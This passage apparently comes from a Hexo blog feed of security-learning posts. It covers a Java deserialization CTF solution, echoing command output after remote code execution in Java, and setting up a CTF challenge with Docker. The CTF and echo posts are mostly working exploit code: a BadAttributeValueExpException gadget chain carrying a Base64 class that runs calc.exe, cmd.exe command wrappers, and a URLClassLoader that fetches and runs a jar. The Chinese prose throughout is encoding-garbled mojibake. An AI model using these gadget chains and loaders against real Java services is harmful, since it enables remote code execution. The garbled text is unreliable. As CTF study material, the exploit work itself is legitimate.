class="hljs-string">&quot;FUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEABHRoaXMBAAlMRXhwbG9pdDsBAA1TdGFja01hcFRhYmxl&quot;</span> +<br>                <span class="hljs-string">&quot;BwAjBwAhAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xh&quot;</span> +<br>                <span class="hljs-string">&quot;bmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBAAxFeHBsb2l0LmphdmEMAAoACwcAJQwAJgAnAQAIY2Fs&quot;</span> +<br>                <span class="hljs-string">&quot;Yy5leGUMACgAKQEAE2phdmEvbGFuZy9FeGNlcHRpb24MACoACwEAB0V4cGxvaXQBABBqYXZhL2xh&quot;</span> +<br>                <span class="hljs-string">&quot;bmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5n&quot;</span> +<br>                <span class="hljs-string">&quot;L1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNz&quot;</span> +<br>                <span class="hljs-string">&quot;OwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACQAAAAAAAgABAAoACwABAAwAAAB8AAIAAgAAABYqtwAB&quot;</span> +<br>                <span class="hljs-string">&quot;uAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAA0AAAAaAAYAAAACAAQABQANAAgAEAAGABEA&quot;</span> +<br>                <span class="hljs-string">&quot;BwAVAAkADgAAABYAAgARAAQADwAQAAEAAAAWABEAEgAAABMAAAAQAAL/ABAAAQcAFAABBwAVBAAJ&quot;</span> +<br>                <span class="hljs-string">&quot;ABYAFwABAAwAAABBAAIAAgAAAAm7AAdZtwAITLEAAAACAA0AAAAKAAIAAAAMAAgADQAOAAAAFgAC&quot;</span> +<br>                <span class="hljs-string">&quot;AAAACQAYABkAAAAIAAEADwASAAEAAQAaAAAAAgAb&quot;</span> );<br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.ezgame.ctf.tools.ToStringBean&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">classByte</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;ClassByte&quot;</span>);<br>        classByte.setAccessible(<span class="hljs-literal">true</span>);<br>        classByte.set(toStringBean,code);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> aClass1.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException,toStringBean);<br>        serialize(badAttributeValueExpException);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><span class="hljs-comment">//        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="hljs-comment">//        ObjectOutputStream objectOutputStream = new ObjectOutputStream(baos);</span><br><span class="hljs-comment">//        objectOutputStream.writeObject(aClass);</span><br><span class="hljs-comment">//        objectOutputStream.writeUTF(&quot;Songshan&quot;);</span><br><span class="hljs-comment">//        objectOutputStream.writeInt(2022);</span><br><span class="hljs-comment">//        objectOutputStream.flush();</span><br><span class="hljs-comment">//        objectOutputStream.close();</span><br><span class="hljs-comment">//        String s = new String(Base64.getEncoder().encode(baos.toByteArray()));</span><br><span class="hljs-comment">//        System.out.printf(s);</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(o);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>javaCTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVAååºåˆ—åŒ–å›æ˜¾å­¦ä¹ </title>
    <link href="/2022/04/04/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/04/04/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="JAVAååºåˆ—åŒ–å›æ˜¾å­¦ä¹ "><a href="#JAVAååºåˆ—åŒ–å›æ˜¾å­¦ä¹ " class="headerlink" title="JAVAååºåˆ—åŒ–å›æ˜¾å­¦ä¹ "></a>JAVAååºåˆ—åŒ–å›æ˜¾å­¦ä¹ </h1><p>åˆšåˆšé—®æ¶›æ¶›å¸ˆå‚…è¦äº†ä¸€ä¸‹ä»–å‡ºçš„é¢˜ï¼Œçªç„¶æƒ³èµ·æ¥å¾ˆå¤šé¢˜éƒ½æ˜¯ä¸å‡ºç½‘æ²¡æœ‰å›æ˜¾çš„ã€‚æ¥å­¦ä¹ ä¸€ä¸‹å§ã€‚</p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.nio.charset.Charset;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RceEcho</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">stream</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;dir&quot;</span>&#125;)).start().getInputStream();<br>        <span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(stream, Charset.forName(<span class="hljs-string">&quot;gbk&quot;</span>));<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(reader);<br>        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">while</span>((line = bufferedReader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>            buffer.append(line).append(<span class="hljs-string">&quot;\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(buffer.toString());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>InputStreamReaderï¼š çš„ä½œç”¨æ˜¯å°†å­—èŠ‚è¾“å…¥æµâ€è½¬æ¢æˆâ€œå­—ç¬¦è¾“å…¥æµã€‚</p><h3 id="å­—èŠ‚æµå’Œå­—ç¬¦æµçš„åŒºåˆ«"><a href="#å­—èŠ‚æµå’Œå­—ç¬¦æµçš„åŒºåˆ«" class="headerlink" title="å­—èŠ‚æµå’Œå­—ç¬¦æµçš„åŒºåˆ«"></a>å­—èŠ‚æµå’Œå­—ç¬¦æµçš„åŒºåˆ«</h3><p>å­—èŠ‚æµé»˜è®¤ä¸ä½¿ç”¨ç¼“å†²åŒºï¼›å­—ç¬¦æµä½¿ç”¨ç¼“å†²åŒºã€‚ å­—èŠ‚æµåœ¨æ“ä½œçš„æ—¶å€™æœ¬èº«æ˜¯ä¸ä¼šç”¨åˆ°ç¼“å†²åŒºçš„ï¼Œæ˜¯ä¸æ–‡ä»¶æœ¬èº«ç›´æ¥æ“ä½œçš„ï¼Œæ‰€ä»¥å­—èŠ‚æµåœ¨æ“ä½œæ–‡ä»¶æ—¶ï¼Œå³ä½¿ä¸å…³é—­èµ„æºï¼Œæ–‡ä»¶ä¹Ÿèƒ½è¾“å‡ºï¼›å­—ç¬¦æµåœ¨æ“ä½œçš„æ—¶å€™æ˜¯ä½¿ç”¨åˆ°ç¼“å†²åŒºçš„ã€‚ å¦‚æœå­—ç¬¦æµä¸è°ƒç”¨closeæˆ–flushæ–¹æ³•ï¼Œåˆ™ä¸ä¼šè¾“å‡ºä»»ä½•å†…å®¹ã€‚</p><p>BufferedReaderï¼šç¼“å†²å»è¯»å–å†…å®¹ã€‚</p><h2 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204041604929.png" alt="QQæˆªå›¾20220402121759"></p><p>å¯ä»¥çœ‹åˆ°defineClasså¯ä»¥è·å–æŒ‡å®šç±»å­—èŠ‚ï¼Œå¹¶ä¸”è¿”å›è¯¥ç±»ã€‚</p><h2 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.nio.charset.Charset;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RceEcho</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RceEcho</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">stream</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;)).start().getInputStream();<br>        <span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(stream, Charset.forName(<span class="hljs-string">&quot;gbk&quot;</span>));<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(reader);<br>        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">while</span>((line = bufferedReader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>            buffer.append(line).append(<span class="hljs-string">&quot;\n&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(buffer.toString());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RceEchoDefine</span> <span class="hljs-keyword">extends</span>  <span class="hljs-title class_">ClassLoader</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;defineClass&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException &#123;<br>        File file=<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;F:\\JavaRceEcho\\target\\classes\\RceEcho.class&quot;</span>);<br>        <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>        bis = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(in);<br>        <span class="hljs-type">byte</span>[] buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> ((len = in.read(buf)) != -<span class="hljs-number">1</span>) &#123;<br>            baos.write(buf, <span class="hljs-number">0</span>, len);<br>        &#125;<br>        <span class="hljs-type">byte</span>[] buffer = baos.toByteArray();<br>        <span class="hljs-type">RceEchoDefine</span> <span class="hljs-variable">defineclasstest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RceEchoDefine</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> defineclasstest.defineClass(<span class="hljs-string">&quot;RceEcho&quot;</span>,buffer,<span class="hljs-number">0</span>,buffer.length);<br>        cls.getConstructor(String.class).newInstance(<span class="hljs-string">&quot;dir&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204041604722.png" alt="QQæˆªå›¾20220404153352"></p><h2 id="URLClassloader"><a href="#URLClassloader" class="headerlink" title="URLClassloader"></a>URLClassloader</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RceUrlClassload</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://127.0.0.1:8888/RceEcho.jar&quot;</span>)&#125;);<br>        Class&lt;?&gt; rceEcho = urlClassLoader.loadClass(<span class="hljs-string">&quot;RceEcho&quot;</span>);<br>       rceEcho.getConstructor(String.class).newInstance(<span class="hljs-string">&quot;ipconfig&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204041604635.png" alt="QQæˆªå›¾20220404155436"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ä¸ªäººå­¦ä¹ åˆ°çš„ä¸¤ç‚¹ï¼šä¸€ä¸ªæ˜¯ç±»ä¼¼å‘½ä»¤å›æ˜¾ï¼Œä¸€ä¸ªåƒæ˜¯è®¿é—®æ–‡ä»¶ä¸‹è½½çš„æ—¶å€™çš„å›æ˜¾ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¦‚ä½•åˆ©ç”¨dockerå‡ºä¸€é“CTFé¢˜</title>
    <link href="/2022/04/02/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8docker%E5%87%BA%E4%B8%80%E9%81%93CTF%E9%A2%98/"/>
    <url>/2022/04/02/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8docker%E5%87%BA%E4%B8%80%E9%81%93CTF%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="å¦‚ä½•åˆ©ç”¨dockerå‡ºä¸€é“CTFé¢˜"><a href="#å¦‚ä½•åˆ©ç”¨dockerå‡ºä¸€é“CTFé¢˜" class="headerlink" title="å¦‚ä½•åˆ©ç”¨dockerå‡ºä¸€é“CTFé¢˜"></a>å¦‚ä½•åˆ©ç”¨dockerå‡ºä¸€é“CTFé¢˜</h1><p>è‡ªå·±ç»™è‡ªå·±ç­å‡ºé¢˜ï¼Ÿç¬¬ä¸€æ¬¡å°è¯•ï¼Œå…ˆæ¥å¥½å¥½å­¦ä¹ ä¸‹dockerã€‚</p><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><ul><li>Ubuntu18.0.04</li><li>docker</li></ul><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>å¥½å¥½å­¦ä¹ ä¸€ä¸‹docker~ã€‚</p><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><h3 id="æ›´æ¢é•œåƒ"><a href="#æ›´æ¢é•œåƒ" class="headerlink" title="æ›´æ¢é•œåƒ"></a>æ›´æ¢é•œåƒ</h3><p><code>vi /etc/apt/sources.list</code>  (æ³¨é‡Šæ‰ä¹‹å‰çš„)</p><p><a href="https://github.com/AndyYoungDev/ubuntu-aliyun-sources/blob/master/sources1804.list">é˜¿é‡Œäº‘</a></p><h3 id="å®‰è£…docker"><a href="#å®‰è£…docker" class="headerlink" title="å®‰è£…docker"></a>å®‰è£…docker</h3><p><a href="https://www.runoob.com/docker/ubuntu-docker-install.html">èœé¸Ÿæ•™ç¨‹</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">apt</span>-get install docker-ce=<span class="hljs-number">5</span>:<span class="hljs-number">20</span>.<span class="hljs-number">10</span>.<span class="hljs-number">14</span>~<span class="hljs-number">3</span>-<span class="hljs-number">0</span>~ubuntu-bionic docker-ce-cli=<span class="hljs-number">5</span>:<span class="hljs-number">20</span>.<span class="hljs-number">10</span>.<span class="hljs-number">14</span>~<span class="hljs-number">3</span>-<span class="hljs-number">0</span>~ubuntu-bionic containerd.io<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203312331572.png" alt="QQæˆªå›¾20220331233127"></p><p>å¯è§å·²ç»å®‰è£…æˆåŠŸã€‚</p><h3 id="æ¶æ„"><a href="#æ¶æ„" class="headerlink" title="æ¶æ„"></a>æ¶æ„</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203312337428.png" alt="QQæˆªå›¾20220331224740"></p><p><strong>Client</strong>ï¼šä¸€äº›dockerçš„å‘½ä»¤ã€‚<br><strong>Docker daemon</strong>ï¼šè´Ÿè´£dockeræ‰§è¡Œå‘½ä»¤ã€‚<br><strong>Registry</strong>ï¼šå’Œdaemonäº¤äº’ï¼Œæ‰€æœ‰dockerç”¨æˆ·å¯å…±äº«é•œåƒã€‚</p><h3 id="ç®€å•ä½¿ç”¨"><a href="#ç®€å•ä½¿ç”¨" class="headerlink" title="ç®€å•ä½¿ç”¨"></a>ç®€å•ä½¿ç”¨</h3><p><code>docker run ubuntu echo xsw6a</code>:ä½¿ç”¨dockeråœ¨ubuntuè¿™å°æœºå™¨ä¸Š(dockerå¼€å¯çš„UbuntuæœåŠ¡)æ‰§è¡Œå‘½ä»¤ <code>echo xsw6a</code>ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203312349814.png" alt="QQæˆªå›¾20220331234948"></p><p><strong>docker images</strong>ï¼šæŸ¥çœ‹å½“å‰å­˜åœ¨çš„é•œåƒã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203312351194.png" alt="QQæˆªå›¾20220331235136"></p><p><strong>docker ps</strong>ï¼šæŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„é•œåƒã€‚<br><strong>docker stop</strong>ï¼šåœæ­¢æ­£åœ¨è¿è¡Œçš„é•œåƒã€‚<br><strong>docker rmi</strong>ï¼šåˆ é™¤é•œåƒã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204010007036.png" alt="QQæˆªå›¾20220401000539"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204010007909.png" alt="QQæˆªå›¾20220401000723"></p><h2 id="ç¬¬ä¸€ä¸ªDockerfile"><a href="#ç¬¬ä¸€ä¸ªDockerfile" class="headerlink" title="ç¬¬ä¸€ä¸ªDockerfile"></a>ç¬¬ä¸€ä¸ªDockerfile</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">FROM alpine:latest  <span class="hljs-regexp">//</span>æ‹‰å–é•œåƒ<br>MAINTAINER xsw6a     <span class="hljs-regexp">//</span>å‘Šè¯‰æ˜¯è°å†™çš„<br>CMD echo <span class="hljs-string">&#x27;hello docker&#x27;</span> <span class="hljs-regexp">//</span>å‘½ä»¤<br></code></pre></td></tr></table></figure><h2 id="ç¬¬äºŒä¸ªDockerfile"><a href="#ç¬¬äºŒä¸ªDockerfile" class="headerlink" title="ç¬¬äºŒä¸ªDockerfile"></a>ç¬¬äºŒä¸ªDockerfile</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu <br><span class="hljs-keyword">MAINTAINER</span> xsw6a     <br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&#x27;s/archive.ubuntu.com/mirrors.ustc.edu.cn/g&#x27;</span> /etc/apt/sources.list</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> ape-get update</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get install -y nginx</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> index.html /var/www/html</span><br>ENTPYPOINT [<span class="hljs-string">&quot;/usr/sbin/nginx&quot;</span>,<span class="hljs-string">&quot;-g&quot;</span>,<span class="hljs-string">&quot;daemon off;&quot;</span>] //å®¹å™¨çš„å…¥ç‚¹    <br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">80</span> //æš´éœ²ç«¯å£<br></code></pre></td></tr></table></figure><h3 id="index-html"><a href="#index-html" class="headerlink" title="index.html"></a>index.html</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">å“ˆå“ˆå“ˆxsw6_a<br></code></pre></td></tr></table></figure><h3 id="åˆ›å»º"><a href="#åˆ›å»º" class="headerlink" title="åˆ›å»º"></a>åˆ›å»º</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build -t xsw6a/hello-nginx .<br></code></pre></td></tr></table></figure><h3 id="è¿è¡Œ"><a href="#è¿è¡Œ" class="headerlink" title="è¿è¡Œ"></a>è¿è¡Œ</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -d -p <span class="hljs-number">80</span>:<span class="hljs-number">80</span> xsw6a/hello-nginx <br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204011649873.png" alt="QQæˆªå›¾20220401164830"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204011656268.png" alt="QQæˆªå›¾20220401165533"><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204011656655.png" alt="QQæˆªå›¾20220401165511"></p><h2 id="é•œåƒåˆ†å±‚"><a href="#é•œåƒåˆ†å±‚" class="headerlink" title="é•œåƒåˆ†å±‚"></a>é•œåƒåˆ†å±‚</h2><p><strong>Dockerfileä¸­æ¯ä¸€å±‚éƒ½éœ€è¦è¿›è¡Œåˆ†å±‚ã€‚</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204011703678.png" alt="QQæˆªå›¾20220401170350"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204011704282.png" 